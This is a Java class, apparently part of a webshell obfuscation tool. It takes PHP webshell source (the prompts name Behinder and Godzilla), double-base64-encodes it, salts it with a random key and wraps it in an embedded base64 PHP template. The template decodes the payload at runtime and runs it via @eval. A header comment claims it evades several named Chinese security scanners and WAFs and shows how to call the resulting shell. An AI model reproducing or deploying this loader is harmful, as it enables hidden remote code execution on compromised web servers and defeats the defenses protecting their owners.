package encode;

import application.RandomString;

import java.io.File;
import java.io.FileInputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

public class PhpEncodeDemo2 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;
    String demo2txt;

    public PhpEncodeDemo2() {
    }

    public PhpEncodeDemo2(String tamplate, String key, String sourcecode) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = sourcecode;
    }
    public String[] Run(){

        if(!sourcecode.isEmpty()){
            try {
                sourcecode = sourcecode.replace("<?php", "").replace("?>", "").trim();
                byte[] bytes = sourcecode.getBytes(StandardCharsets.UTF_8);
                String s = Base64.getEncoder().encodeToString(Base64.getEncoder().encode(bytes));
                if(this.key.equals("默认随机")){
                    this.key = RandomString.getRString(8);
                }

                StringBuilder stringBuilder = new StringBuilder(s);
                int aa = new Random().nextInt((stringBuilder.length())/2)+1;
                for (int i = aa;  i > 0; i = new Random().nextInt(i)) {
                    stringBuilder.insert(i,this.key);
                }
                s = stringBuilder.toString();

                String demo2 = "PD9waHAgLyoka2V5JCovCmhlYWRlcignU2VydmU6Jy5iYXNlNjRfZW5jb2RlKF9fRklMRV9fKSk7CiRwYXNzd29yZD0nJGJhc2U2NGNvZGUkJzsKb2Jfc3RhcnQoKTsKcmVhZGZpbGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnZmlsZSddKSk7CiRmaWxlID0gb2JfZ2V0X2NvbnRlbnRzKCk7Cm9iX2VuZF9jbGVhbigpOwokdXNlcm5hbWUgPSBzdWJzdHIoJGZpbGUsOCw4KTsKJHRlbXBsYXRlX3NvdXJjZSA9IHN0cl9yZXBsYWNlKCR1c2VybmFtZSwnJywkcGFzc3dvcmQpOwokdGVtcGxhdGVfc291cmNlID0gYmFzZTY0X2RlY29kZSgkdGVtcGxhdGVfc291cmNlKTsKJHRlbXBsYXRlX3NvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJHRlbXBsYXRlX3NvdXJjZSk7CiRrZXkgPSAndGVtcGxhdGVfc291cmNlJzsKJGFlc19kZWNvZGVbMV09JCRrZXk7CkBldmFsKCRhZXNfZGVjb2RlWzFdKTs=";
                encode = new String(Base64.getDecoder().decode(demo2));

                encode = encode.replace("$key$",this.key);
                encode = encode.replace("$base64code$",s);

                demo2txt =
                        "/*\n" +
                        " * By: XG小刚\n" +
                        " * Time: 2023-09-03_demo2\n" +
                        " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
                        " * 传参: /xxxx.php?file=QzpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXDEyMy5waHA=\n" +
                        " * file参数为响应头中serve值\n" +
                        " */";
                return new String[]{this.encode,this.demo2txt};
            }catch (Exception e){
                return new String[]{"加密失败",this.demo2txt};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉php源码", this.demo2txt};
        }
    }
}
